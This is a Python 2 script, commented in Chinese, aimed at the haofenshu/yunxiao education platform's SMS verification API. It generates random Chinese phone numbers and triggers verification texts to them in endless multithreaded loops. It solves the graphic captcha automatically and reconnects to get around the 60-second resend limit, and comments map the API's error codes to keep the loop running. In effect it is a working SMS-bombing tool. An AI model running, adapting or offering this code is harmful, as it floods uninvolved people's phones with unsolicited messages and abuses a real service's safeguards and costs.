#-*- coding:utf-8 -*-
import requests,thread
from _random import Random
from goto import with_goto
from traceback import format_exc
from time import sleep
from get_svg_captcha import get_svg_captcha
random=Random().random
phone_header=("30","31","32","33","35","36","37","38","39","50","51","52","53","55","56","57","58","59","62","65","66","67","70","71","72","73","75","76","77","78","80","81","82","83","84","85","86","87","88","89","90","91","92","93","95","96","97","98","99")
random_phone=lambda:"".join(("1",phone_header[int(random()*49)],str(int(random()*99999999)).zfill(8)))
random_data0=lambda phone:"".join(("{\"phoneNumber\":\"",phone,"\",\"roleType\":1}"))
random_data1=lambda phone,code:"".join(("{\"phoneNumber\":\"",phone,"\",\"roleType\":1,\"code\":\"",code,"\"}"))
requests.adapters.DEFAULT_POOLSIZE=255
roleType="1"
chrome_version0="96.0.4664.93"
chrome_version1=chrome_version0.split(".")[0]
ua="".join(("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",chrome_version0," Safari/537.36"))
match_headers={"accept":"application/json, text/plain, */*",
"accept-encoding":"gzip, deflate, br",
"accept-language":"zh-CN,zh;q=0.9,en;q=0.8",
"origin":"https://www.haofenshu.com",
"referer":"https://www.haofenshu.com/",
"sec-ch-ua":"".join(("\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"",chrome_version1,"\", \"Google Chrome\";v=\"",chrome_version1,"\"")),
"sec-ch-ua-mobile":"?0",
"sec-ch-ua-platform":"\"Windows\"",
"sec-fetch-dest":"empty",
"sec-fetch-mode":"cors",
"sec-fetch-site":"cross-site",
"user-agent":ua}
captcha0_headers={"accept":"application/json, text/plain, */*",
"accept-encoding":"gzip, deflate, br",
"accept-language":"zh-CN,zh;q=0.9,en;q=0.8",
"content-length":"42",
"content-type":"application/json;charset=UTF-8",
"origin":"https://www.haofenshu.com",
"referer":"https://www.haofenshu.com/",
"sec-ch-ua":"".join(("\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"",chrome_version1,"\", \"Google Chrome\";v=\"",chrome_version1,"\"")),
"sec-ch-ua-mobile":"?0",
"sec-ch-ua-platform":"\"Windows\"",
"sec-fetch-dest":"empty",
"sec-fetch-mode":"cors",
"sec-fetch-site":"cross-site",
"user-agent":ua}
captcha1_headers={"accept":"application/json, text/plain, */*",
"accept-encoding":"gzip, deflate, br",
"accept-language":"zh-CN,zh;q=0.9,en;q=0.8",
"content-length":"56",
"content-type":"application/json;charset=UTF-8",
"origin":"https://www.haofenshu.com",
"referer":"https://www.haofenshu.com/",
"sec-ch-ua":"".join(("\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"",chrome_version1,"\", \"Google Chrome\";v=\"",chrome_version1,"\"")),
"sec-ch-ua-mobile":"?0",
"sec-ch-ua-platform":"\"Windows\"",
"sec-fetch-dest":"empty",
"sec-fetch-mode":"cors",
"sec-fetch-site":"cross-site",
"user-agent":ua}
#roleType:角色类型(疑似区分家长帐号和学生帐号,但目前来看输入什么都可以)
#account:手机号
#occupied:手机号是否已被注册
#unionId:翻译为"统一号",但返回值只有null不知道有啥用
#boundWechat,boundApple:在chrome和via上只有false(疑似来自/跳转至微信/苹果(safari?))
@with_goto
def send_loop(lock,write):
    try:
        label.tag_connect
        connect=requests.Session()
        label.tag_match
        phone=random_phone()
        #match和captcha共用一个连接
        #match,否则不能发送验证码,手机号重复,手机号错误(不是11位等)等情况貌似不会使匹配失败,目前已知失败的情况只有手机号已被注册
        response=connect.get("".join(("https://hfs-be.yunxiao.com/v2/users/matched-users?roleType=",roleType,"&account=",phone)),headers=match_headers)
        ###debug###
        #print(str(response.json()["code"])+":"+response.json()["msg"])
        #sleep(1)
        ###用完注释掉###
        json=response.json()
        if json["data"]["occupied"]:
            goto.tag_match
        if json["code"]==0:
            #code:0,成功
            #code:4048,需要图形验证码,发送失败
            #code:4049,60s后才能重新发送,需要重新connect
            #code:1001,参数错误,出现在没match就请求的时候,与match的请求不是同一个连接,与match的请求不是同一个手机号,或者就是字面意思比如长度不对等,需要重新match
            label.tag_captcha0
            #第一次请求,判断是否需要填图形验证码
            response=connect.post("".join(("https://hfs-be.yunxiao.com/v2/native-users/verification-msg-with-captcha")),headers=captcha0_headers,data=random_data0(phone))
            ###debug###
            #print(str(response.json()["code"])+":"+response.json()["msg"])
            #sleep(1)
            ###用完注释掉###
            json=response.json()
            code=json["code"]
            if code==0:
                goto.tag_captcha0
            elif code==1001:
                goto.tag_match
            elif code==4048:
                label.tag_captcha1
                #要填图形验证码的请求
                response=connect.post("".join(("https://hfs-be.yunxiao.com/v2/native-users/verification-msg-with-captcha")),headers=captcha1_headers,data=random_data1(phone,get_svg_captcha(json["data"]["pic"])))
                ###debug###
                #print(str(response.json()["code"])+":"+response.json()["msg"])
                #sleep(1)
                ###用完注释掉###
                json=response.json()
                code=json["code"]
                if code==0:
                    goto.tag_captcha0
                elif code==1001:
                    goto.tag_match
                elif code==4048:
                    goto.tag_captcha1
                elif code==4049:
                    connect.close()
                    goto.tag_connect
            elif code==4049:
                connect.close()
                goto.tag_connect
        else:
            goto.tag_match
    except Exception as error:
        write("================\nsend_loop error\n")
        write(format_exc())
        write("================\n")
        lock.release()
        return
    write("================\nsend_loop finish\n")
    write(response.text)
    write("================\n")
    lock.release()
    return
if __name__=="__main__":#命令行调用,"python main.py"或"python main.py poolsize=[int] roleType=[byte] chrome_version=[str] threads=[int] logfile=[str] print=[bool]",每个参数都是可选的,如有重复后面的会覆盖前面的,poolsize连接池大小默认255,roleType默认"1",chrome_version默认"96.0.4664.93",threads线程数量默认1,logfile日志文件路径默认打印到控制台,print默认将log打印到控制台即使logfile不是默认
    @with_goto
    def main():
        console=True
        threads=1
        from sys import argv,__stdout__,__stderr__,stdout,stderr
        if len(argv)==1:
            lock=thread.allocate_lock()
            lock.acquire()
            thread.start_new_thread(send_loop,(lock,stdout.write))
            stdout.write("start thread\n")
            label.lock_loop
            if not lock.locked():
                stdout.write("end thread\n")
                lock.acquire()
                thread.start_new_thread(send_loop,(lock,stdout.write))
                stdout.write("start thread\n")
            sleep(1)
            goto.lock_loop
        else:
            for a in argv[1::]:
                a=a.split("=")
                key=a[0].strip()
                value=a[1].strip()
                if key=="poolsize":
                    requests.adapters.DEFAULT_POOLSIZE=int(value)
                elif key=="roleType":
                    if len(value)==1:
                        roleType=value
                    else:
                        __stderr__.write("error:roleType is not byte\n")
                elif key=="chrome_version":
                    chrome_version0=value
                elif key=="threads":
                    threads=int(value)
                elif key=="logfile":
                    value=open(value,"ab")
                    stdout=stderr=value
                elif key=="print":
                    if value=="True":
                        console=True
                    elif value=="False":
                        console=False
                    else:
                        __stderr__.write("error:print is not bool\n")
                        return
                else:
                    __stderr__.write("error:unknown param\n")
                    return
            if __stdout__==stdout and __stderr__==stderr:
                if console:
                    write=stdout.write
                else:
                    write=lambda data:None
            else:
                if console:
                    def write(data):
                        __stdout__.write(data)
                        stdout.write(data)
                else:
                    write=stdout.write
            #给每个线程一把锁,线程退出会解锁,主进程一直判断锁是否被锁定,来保证主进程在子线程之后退出并补充可能因报错退出的子线程,每次循环sleep 1000ms,线程不要开太多,差不多半组就够了,多了速度会慢
            locks=[]
            for a in range(threads):
                lock=thread.allocate_lock()
                lock.acquire()
                locks.append(lock)
                thread.start_new_thread(send_loop,(lock,write))
                write("start thread\n")
            label.locks_loop
            a=0
            while a<threads:
                if not locks[a].locked():
                    write("end thread\n")
                    locks[a].acquire()
                    thread.start_new_thread(send_loop,(locks[a],write))
                    write("start thread\n")
                a=a+1
                sleep(1)
            goto.locks_loop
    main()